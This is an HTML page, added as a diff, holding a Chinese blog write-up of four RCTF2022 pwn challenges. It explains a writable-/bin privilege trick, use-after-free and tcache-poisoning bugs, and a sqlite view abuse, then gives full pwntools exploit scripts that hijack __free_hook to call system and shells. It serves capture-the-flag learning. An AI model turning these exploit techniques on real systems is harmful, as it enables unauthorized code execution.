@@ -1,0 +1,766 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>RCTF2022-PWN-WP/复现 | kotori的菜园</title>
+<link rel="shortcut icon" href="https://kotoriseed.github.io//favicon.ico?v=1718591155332">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://kotoriseed.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="RCTF2022-PWN-WP/复现 | kotori的菜园 - Atom Feed" href="https://kotoriseed.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PJDEM99E9P"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PJDEM99E9P');
+</script>
+
+
+    <meta name="description" content="game[非预期]
+本来是kernel提权题，但docker起起来之后发现/bin权限比较大，所以存在非预期。
+
+init是root权限运行的，
+
+在shell退出之后还有umount和poweroff两个指令。所以劫持其中一个binary..." />
+    <meta name="keywords" content="WP" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://kotoriseed.github.io/">
+  <img class="avatar" src="https://kotoriseed.github.io//images/avatar.png?v=1718591155332" alt="">
+  </a>
+  <h1 class="site-title">
+    kotori的菜园
+  </h1>
+  <p class="site-description">
+    挑战者贵为永恒黄金
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              RCTF2022-PWN-WP/复现
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-12-16
+              </span>
+              <span>
+                14 min read
+              </span>
+              
+                <a href="https://kotoriseed.github.io/tag/0eC34PvND/" class="post-tag">
+                  # WP
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="game非预期">game[非预期]</h1>
+<p>本来是kernel提权题，但docker起起来之后发现<code>/bin</code>权限比较大，所以存在非预期。</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/7f28ea8ce7380.png" alt="1671183918059.png" loading="lazy"></figure>
+<p><code>init</code>是root权限运行的，</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/c30d3dd6f9b0f.png" alt="1671183969695.png" loading="lazy"></figure>
+<p>在shell退出之后还有<code>umount</code>和<code>poweroff</code>两个指令。所以劫持其中一个binary，然后退出shell就能带出flag。</p>
+<pre><code class="language-shell">cd /bin
+rm ./umount
+echo 'cat flag'&gt;umount
+chmod 777 ./umount
+exit
+</code></pre>
+<h1 id="ez_atm">ez_atm</h1>
+<h2 id="分析">分析</h2>
+<p>给出了一个客户端<code>client</code>和带有漏洞的服务端<code>ez_atm</code>，两者使用socket进行通信。</p>
+<p>查看<code>Data_send</code>结构体即可了解通讯使用的协议，</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/dda7b04ec200a.png" alt="1671164220749.png" loading="lazy"></figure>
+<p>在建立socket连接之后，服务端会fork出一个子进程，并且即刻生成该次会话使用的uuid，并且将随机数使用的种子发给客户端。然后会尝试从客户端收到uuid并验证是否一致。</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/94ead074d25ef.png" alt="1671164490295.png" loading="lazy"></figure>
+<p>客户端对应的操作是接受到种子并用相同的逻辑生成uuid，然后发送。</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/b8030e68d0ba0.png" alt="1671164596484.png" loading="lazy"></figure>
+<p>主要功能的逆向略过，这里只说漏洞点。</p>
+<p>第一个是leak libc，在<code>stat_query</code>中。</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/acdf4ef8fd8f3.png" alt="1671166153796.png" loading="lazy"></figure>
+<p>这里send过来了很多栈上的数据，可以帮助leak。</p>
+<p>但是在发送到客户端之后直接被接收了，我们需要对客户端稍作修改，让他打印出来。</p>
+<p>（其实是还有另一种思路的，不使用客户端去交互，直接按照协议手动发包模拟客户端行为。只不过这样就需要在一开始验证uuid那里手动按照逻辑生成一下）</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/15/be17183e0e3e1.png" alt="1671084514031.png" loading="lazy"></figure>
+<p>这里是libc上的地址，测出偏移后将客户端对应部分patch如下：</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/15/e8dd6173fe2cd.png" alt="1671084764752.png" loading="lazy"></figure>
+<p>测试一下，成功leak：</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/15/7cf085c934dd4.png" alt="1671085000540.png" loading="lazy"></figure>
+<p>在<code>new_account</code>中会申请0x41的chunk，然后<code>passwd</code>和<code>account_id</code>分别对应了tcache的<code>next</code>和<code>key</code>的位置。</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/96e6a5f7cd27e.png" alt="1671170791940.png" loading="lazy"></figure>
+<p>在<code>cancellation</code>中存在明显的uaf。</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/04eb063b3db3f.png" alt="1671171007280.png" loading="lazy"></figure>
+<p>思路至此就很明显了，tcache poisoning申请到free hook写入system。</p>
+<p>不过想要uaf修改，还需要先login，一个account被free之后password会是堆上的地址，所以还需要leak一下。</p>
+<p>布置好freed chunk之后还是先在client的内存中找到heap地址相对于<code>msg_rec</code>的偏移</p>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/a040e060d620b.png" alt="1671176781065.png" loading="lazy"></figure>
+<p>然后对client的query功能patch如下：</p>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/7f233395d3e8c.png" alt="1671176871678.png" loading="lazy"></figure>
+<p>成功leak，</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/ae639937b6301.png" alt="1671176921530.png" loading="lazy"></figure>
+<p>接下来就是正常的uaf劫持tcache next指针，这里不作详细描述。</p>
+<p>成功劫持free hook后外带flag使用<code>cat flag&gt;&amp;4</code>来发给客户端。</p>
+<p>不过用free hook来执行system时，参数是<code>password</code>处，而<code>password</code>的长度只有8bytes，有点不够，所以需要配合<code>account_id</code>来拼接。所以我的构造如下：</p>
+<ul>
+<li>account_id: &gt;&amp;4</li>
+<li>password: cat flag</li>
+</ul>
+<h2 id="exp">exp</h2>
+<p>(需要模拟client发送协议交互的话可以参考注释掉的两个函数来建立连接和发包)</p>
+<pre><code class="language-python">from pwn import *
+from ctypes import *
+import os
+
+context.log_level='debug'
+
+elf = ELF('./docker/bin/ez_atm')
+libc = ELF('./docker/bin/libc-2.27.so')
+clibc = cdll.LoadLibrary('./docker/bin/libc-2.27.so')
+
+sa  = lambda x,y : p.sendafter(x, y)
+sla = lambda x,y : p.sendlineafter(x, y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g():
+	os.system('ps -a | grep ez_atm')
+	raw_input()
+
+'''
+def init_cli():
+	ask_time = u32(p.recv(4))
+	# print(hex(ask_time))
+	clibc.srand(ask_time)
+	uuid = list(&quot;yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy&quot;)
+	for i in range(len(uuid)):
+		if uuid[i] != '4' and uuid[i] != '-':
+			if uuid[i] == 'x':
+				uuid[i] = hex(clibc.rand()%15)[2:]
+			else:
+				uuid[i] = hex((clibc.rand()%15) &amp; 3 | 8)[2:]
+	uuid = ''.join(uuid)
+	p.send(uuid)
+
+def data_send(op, password=b'', account_id=b'', money=114514):
+	data = flat(
+		{
+			0x0: op,
+			0x10: password,
+			0x18: account_id,
+			0x38: p32(money),
+		},
+		filler=b'\x00'
+	).ljust(0x98, b'\x00')
+	sleep(0.5)
+	p.send(data)
+'''
+
+def choice(op):
+	sla('choice :', op)
+
+def add_account(id='kotori', passwd='passwd', money=114514):
+	choice('new_account')
+	sla('account id', id)
+	sla('password', passwd)
+	sla('money', str(money))
+
+def del_account(passwd='passwd'):
+	choice('cancellation')
+	sla('password', passwd)
+
+def login(id, passwd='passwd'):
+	choice('login')
+	sla('account id', id)
+	sla('password', passwd)
+
+def edit_passwd(new_pass, old_pass):
+	choice('update_pwd')
+	sla('new password', new_pass)
+	sleep(0.5)
+	sla('rd.', old_pass)
+
+p = process(['./client', '139.9.242.36', '4445'])
+# p = process(['./client', '127.0.0.1', '3339'])
+
+'''
+p = remote('127.0.0.1', 3339)
+init_cli()
+
+data_send('new_account', 'passwd', 'ko1')
+data_send('exit_account')
+data_send('new_account', 'passwd', 'ko2')
+data_send('cancellation', 'passwd')
+data_send('login', 'passwd', 'ko1')
+data_send('query')
+'''
+
+choice('stat_query')
+libcbase = u64(ru('\x7f')[-6:].ljust(0x8, b'\x00')) - 0x21c87
+sys = libcbase + libc.symbols['system']
+hook = libcbase + libc.symbols['__free_hook']
+print(hex(libcbase))
+print(hex(hook))
+
+# data_send('new_account', 'passwd', 'ko1')
+add_account('ko1')
+choice('exit_account')
+add_account('ko2')
+del_account()
+login('ko1')
+choice('query')
+heapbase = u64(ru('\x55')[-6:].ljust(0x8, b'\x00')) - 0x10
+print(hex(heapbase))
+choice('exit_account')
+
+add_account('ko3')
+choice('exit_account')
+add_account('ko4')
+choice('exit_account')
+login('ko3')
+del_account()
+login('ko4')
+del_account()
+
+login(p64(heapbase+0x10), p64(heapbase+0x6b0))
+edit_passwd(p64(hook), p64(heapbase+0x6b0))
+choice('exit_account')
+
+add_account('&gt;&amp;4', 'cat flag')
+choice('exit_account')
+add_account('pwn', p64(sys))
+choice('exit_account')
+login('&gt;&amp;4', 'cat flag')
+del_account('cat flag')
+
+# g()
+
+p.interactive()
+</code></pre>
+<h1 id="ppurey">ppurey</h1>
+<h2 id="分析-2">分析</h2>
+<p>一个管理数据库的菜单题。看上去没什么问题，不过在<code>show_note</code>内部存在一个语句：<code>SELECT * FROM test</code></p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/9684c52585dcc.png" alt="1671193372553.png" loading="lazy"></figure>
+<p>只要让一个视图也叫<code>test</code>，就能执行很多操作。不过到这里之后思路忽然就断了，不是很能找到他可利用的洞在哪里。</p>
+<p>在这时忽然发现bss段上存在一个<code>g_chunks</code>数组，</p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/b81299c4dc07b.png" alt="1671193684388.png" loading="lazy"></figure>
+<p>交叉引用一看，好家伙。很可疑的四个函数。</p>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/92a226b032acc.png" alt="1671193761393.png" loading="lazy"></figure>
+<p>随便找到一个，继续交叉引用，来到了data段上，发现了几个奇怪的字符串&quot;sm&quot;, &quot;se&quot;, &quot;ss&quot;, &quot;sd&quot;。</p>
+<figure data-type="image" tabindex="18"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/b212e5c1d98d7.png" alt="1671193826181.png" loading="lazy"></figure>
+<p>继续在前后看了看，发现了&quot;random&quot;, &quot;hex&quot;, &quot;ifnull&quot;等字符串，</p>
+<p>ん?这不就是sqlite3函数的symbol么。</p>
+<p>至此，一片新世界打开了。</p>
+<p>&quot;sm&quot;, &quot;se&quot;, &quot;ss&quot;, &quot;sd&quot;分别对应堆块的malloc, edit, show, delete操作，并且在delete操作中存在uaf</p>
+<figure data-type="image" tabindex="19"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/16/4d695eac1ef9b.png" alt="1671194070865.png" loading="lazy"></figure>
+<p>整理一下思路：</p>
+<ol>
+<li>利用原有的菜单功能创建一个数据库，并且将<code>test</code>作为视图操作写入这个数据库中</li>
+<li>在<code>test</code>中利用<code>sm</code>, <code>se</code>, <code>ss</code>, <code>sd</code>这几个函数来操作堆块</li>
+<li>uaf打tcache的next，劫持<code>__free_hook</code>为system完成利用。</li>
+</ol>
+<p>（在做题的时候发现，这题的heap布局极其凌乱，不过好在show是直接write，所以拿一个unsorted bin上的chunk就可以直接leak出残留的libc地址。好久都没做到不是<code>puts</code>来show的题了，泪目）</p>
+<h2 id="exp-2">exp</h2>
+<pre><code class="language-python">from pwn import *
+import sqlite3
+import os
+
+context.log_level='debug'
+
+elf = ELF('./ppuery')
+libc = elf.libc
+
+# p = process('./ppuery')
+p = remote('190.92.233.46', 10000)
+
+sa  = lambda x,y : p.sendafter(x,y)
+sla = lambda x,y : p.sendlineafter(x,y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g(arg=''):
+	gdb.attach(p, arg)
+    raw_input()
+
+def choice(idx):
+	sla('Choice: ', str(idx))
+
+def add_note(name):
+	choice(1)
+	sla('Name: ', name)
+
+def show_note(idx):
+	choice(2)
+	sla('Index: ', str(idx))
+
+def patch_note(idx, content):
+	choice(3)
+	sla('Index: ', str(idx))
+	sla('Size: ', str(len(content)))
+	sla('tent: ', content)
+
+def exec_cmd(cmd):
+	os.system(&quot;rm ./kotori.db&quot;)
+	conn = sqlite3.connect('kotori.db')
+	cur = conn.cursor()
+	sql_cmd = 'CREATE VIEW test AS SELECT {}'.format(cmd)
+	print(sql_cmd)
+	cur.execute(sql_cmd)
+	conn.commit()
+	conn.close()
+	f = open('kotori.db', 'rb').read()
+	patch_note(0, f)
+	show_note(0)
+
+def add(idx, size):
+	exec_cmd('sm({},{})'.format(idx, size))
+
+def edit(idx, offset, content):
+	exec_cmd('se({},{},{})'.format(idx, offset, content))
+
+def show(idx):
+	exec_cmd('ss({})'.format(idx))
+
+def delete(idx):
+	exec_cmd('sd({})'.format(idx))
+
+add_note('aa')
+
+add(0, 0x1f0)
+show(0)
+ru('Content:')
+libcbase = u64(p.recv(8)) - 0x3ebca0
+sys = libcbase + libc.symbols['system']
+hook = libcbase + libc.symbols['__free_hook']
+print(hex(libcbase))
+
+add(1, 0xb0)
+add(2, 0xb0)
+delete(1)
+delete(2)
+edit(2, 0, hook)
+
+add(3, 0xb0)
+add(4, 0xb0)
+edit(3, 0, u64(b'/bin/sh\x00'))
+edit(4, 0, sys)
+
+delete(3)
+# g()
+
+p.interactive()
+</code></pre>
+<h1 id="mycarshowspeed">MyCarShowSpeed</h1>
+<p>又是我最爱的游戏题（划掉）</p>
+<figure data-type="image" tabindex="20"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/18/ef592c508cf10.png" alt="1671354090140.png" loading="lazy"></figure>
+<h2 id="分析-3">分析</h2>
+<p>一个赛车游戏，给出了源码。</p>
+<p>经过一段时间的查找，发现在赢得足够多的钱的时候可以直接在商店购买flag</p>
+<pre><code class="language-c">//store.c
+
+...
+
+static goods_t normalCar = {&quot;NormalCar&quot;, 50};
+static goods_t superCar = {&quot;SuperCar&quot;, 100};
+static goods_t LongCar = {&quot;LongCar&quot;, 180};
+static goods_t ghostCar = {&quot;GhostCar&quot;, 200};
+static goods_t fuel = {&quot;Fuel&quot;, 10};
+static goods_t normalTire = {&quot;NormalTire&quot;, 20};
+static goods_t SuperTire = {&quot;SuperTire&quot;, 80};
+static goods_t flag = {&quot;flag&quot;, 9999};
+
+...
+
+void sellGoodsImpl(store_t *_this, game_t *game)
+{
+	...
+        else if(strcmp(goods-&gt;name, &quot;flag&quot;) == 0)
+        {
+            ....
+            
+			else
+            {
+                int fd;
+                char buf[64];
+                puts(&quot;You've earned it!&quot;);
+                puts(&quot;Here is your flag!&quot;);
+                fd = open(&quot;./flag&quot;, O_RDONLY);
+                if(fd &gt;= 0)
+                {
+                    read(fd, buf, 64);
+                    write(1, buf, 64);
+                }
+            }
+			return;
+        }
+		...
+}
+</code></pre>
+<p>所以着重观察一下和钱相关的部分。</p>
+<p>在<code>fetchCarImpl</code>中，出题人好心的给出了一个注释：<code>//0</code></p>
+<pre><code class="language-c">//store.c
+car_t * fetchCarImpl(store_t *_this, game_t *game)
+{
+    ...
+
+    fixDifficulty = car-&gt;fixDifficulty;
+    
+    ...
+    
+    fetchTime = fetchHour * 3600 +  fetchMin * 60 + fetchSec * fixDifficulty;// 0
+    fixTime   = fixHour * 3600 + fixMin * 60 + fixSec;
+    
+    fixedTime = fetchTime - fixTime;
+    cost = 5 * fixedTime;
+    if(cost &gt; (int)game-&gt;money)
+        cost = game-&gt;money;
+    car-&gt;health += (int)(fixedTime * 0.4) + 50;
+    game-&gt;money -= cost;
+    
+    ...
+        
+}
+</code></pre>
+<p>如果<code>fixDifficulty</code>为0的话，<code>fetchTime</code>将会小于<code>fixTime</code>，那么<code>cost</code>也将变为负数......</p>
+<p><code>game-&gt;money -= cost</code>这一句，不就可以帮助我们快速搞钱了吗。</p>
+<p>所以赶紧去找找<code>fixDifficulty</code>的来头。</p>
+<pre><code class="language-c">//car.h
+struct car
+{
+    char        name[8];
+    uint8_t     type; 
+    uint8_t     performance;
+    uint8_t     isTaken;
+    uint8_t     isWon;
+    uint8_t     fixed;
+    uint8_t     step;
+    uint8_t     fixDifficulty; 
+    
+    ...
+    
+};
+</code></pre>
+<p>这个<code>fixDifficulty</code>是在<code>car.h</code>中声明的一个<code>unit8_t</code>类型的变量，</p>
+<p>并且每局比赛结束会有<code>_this-&gt;finishGame(_this)</code>这一句来调用<code>finishGameImpl</code>，</p>
+<p><code>finishGameImpl</code>会让<code>car-&gt;fixDifficulty++;</code>。</p>
+<p>所以说，只要快速刷对局，到第255次之后，不停的修车取车就能大赚一笔。</p>
+<p>（ps. 最好将时间的秒数控制在较大的秒数，不然会刷的很慢）</p>
+<p>（pps. 你每次调试都要等差不多一分钟的样子真的很狼狈.jpg）</p>
+<p>虽然钱是拿到了，但是这时又注意到购买flag的另一个检查条件。</p>
+<pre><code class="language-c">//store.h
+if(game-&gt;winTimes &lt; 1000)
+{  
+	puts(&quot;No! You cheated in this game! Where did your money come from?\n&quot;);
+	puts(&quot;Punish for cheaters!\nYour cars are confiscated!&quot;);
+	carList_t *curCar = game-&gt;carList;
+	while(curCar)
+	{
+		car_t *car = curCar-&gt;car;
+		if(car)
+		{
+			free(car);
+			curCar-&gt;car = NULL;
+		}
+		curCar = curCar-&gt;next;
+	}
+	game-&gt;carList-&gt;carNums = 0;
+	game-&gt;userCar = NULL;
+}
+</code></pre>
+<p>要让这个<code>winTimes</code>要达到1000，还需要再想一些办法。（比赛中到这里就停下来啦，后面的做法参考了<code>Nu1L</code>战队的WriteUp）</p>
+<p>这个时候其实可以察觉到，好像买flag被发现作弊时清空车辆的时候是存在uaf的。</p>
+<p>并且除了这里的<code>game-&gt;carList</code>以外，在<code>store.c</code>中修车和取车时还有一个carList。</p>
+<p>相当于<code>game-&gt;carList</code>成为了一个dangling pointer。</p>
+<p>并且参考<code>car.h</code>中对car的定义：</p>
+<pre><code class="language-c">struct car
+{
+    char        name[8];
+    uint8_t     type; 
+    uint8_t     performance;
+    uint8_t     isTaken;
+    uint8_t     isWon;
+    uint8_t     fixed;
+    uint8_t     step;
+    uint8_t     fixDifficulty; 
+    
+    int         fuel;
+    int         stability;
+    int         health; 
+    int         row;
+    int         col;
+    int         cost;
+    int         padding;
+    time_t      fixTime;
+
+    int         (*moveCar)(car_t *_this);
+    void        (*addFuel)(car_t *_this);
+    void        (*increaseSpeed)(car_t *_this);
+    void        (*gainExp)(car_t *_this);
+    void        (*fix)(car_t *_this);
+    void        (*printCar)(car_t *_this);
+    int         (*getStep)(car_t *_this);
+
+};
+</code></pre>
+<p>在本来属于<code>tcache</code>的<code>key</code>的值的那个位置，会有许多的<code>uint8_t</code>类型的标记位，且很多标记位在取车和修车时都在被修改，所以<code>tcache bin</code>对double free的check会有相当大的概率可以被bypass。</p>
+<p>所以最少只需要按照：</p>
+<ol>
+<li>修车，将当前car放入<code>store-&gt;carList</code></li>
+<li>购买flag，将car free进入tcache bin。</li>
+<li>取车，从<code>store-&gt;carList</code>中拿出，并且改掉某些标记位从而让key不被check</li>
+</ol>
+<p>这几个步骤来循环3次，就能在tcache中造出环，且足以完成对<code>winTimes</code>的劫持。</p>
+<p>（需要注意的是，每次在购买flag之后，车名会因为进入tcache而变化）</p>
+<p>（取车时还可以通过车名leak出heapaddr，借此计算出winTimes的地址）</p>
+<h2 id="exp-3">exp</h2>
+<pre><code class="language-python">from pwn import *
+from datetime import *
+
+context.log_level='debug'
+
+elf = ELF('./SpeedGame')
+
+p = process('./SpeedGame')
+
+sa  = lambda x,y : p.sendafter(x,y)
+sla = lambda x,y : p.sendlineafter(x,y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g(arg=''):
+	gdb.attach(p, arg)
+
+def choice(op):
+	sla('\n&gt;', op)
+
+def buyCar(name):
+	choice('3')
+	choice('1')
+	choice('SuperCar')
+	choice(name)
+	choice('5')
+
+def buyFlag():
+	choice('3')
+	choice('1')
+	choice('flag')
+	choice('5')
+
+def buyFlag():
+	choice('3')
+	choice('1')
+	choice('flag')
+	choice('5')
+
+def fixCar(name=''):
+	choice('3')
+	choice('3')
+	choice(name)
+	choice('5')
+
+def fetchCar(name):
+	choice('3')
+	choice('4')
+	choice(name)
+	choice('5')
+
+def play():
+	choice('1')
+	ru('Press q to quit.')
+	p.send(' ')
+	p.send('q')
+
+buyCar('kot')
+
+for i in range(255):
+	play()
+
+while(datetime.now().second&lt;40):
+	sleep(1) # fixsec++
+	print('[+] waiting for big sec...')
+
+for i in range(60): # earn money
+	fixCar('kot')
+	fetchCar('kot')
+
+fixCar('kot')
+buyFlag()
+fetchCar('')
+
+fixCar()
+buyFlag()
+choice('3')
+choice('4')
+ru('CarName: ')
+cname = p.recv(6)
+choice(cname)
+choice('5')
+
+heap_info = u64(cname.ljust(0x8, b'\x00'))
+
+print(hex(heap_info))
+
+fixCar(cname)
+buyFlag()
+fetchCar(cname)
+
+winTimes_addr = heap_info - 0x2b0
+buyCar(p64(winTimes_addr))
+buyCar('kot')
+buyCar(p64(0xffffffff)) # hijack winTimes
+
+buyFlag()
+
+# g()
+
+p.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#game%E9%9D%9E%E9%A2%84%E6%9C%9F">game[非预期]</a></li>
+<li><a href="#ez_atm">ez_atm</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90">分析</a></li>
+<li><a href="#exp">exp</a></li>
+</ul>
+</li>
+<li><a href="#ppurey">ppurey</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90-2">分析</a></li>
+<li><a href="#exp-2">exp</a></li>
+</ul>
+</li>
+<li><a href="#mycarshowspeed">MyCarShowSpeed</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90-3">分析</a></li>
+<li><a href="#exp-3">exp</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://kotoriseed.github.io/post/bytectf2022/">
+              <h3 class="post-title">
+                ByteCTF2022-PWN-复现
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://kotoriseed.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
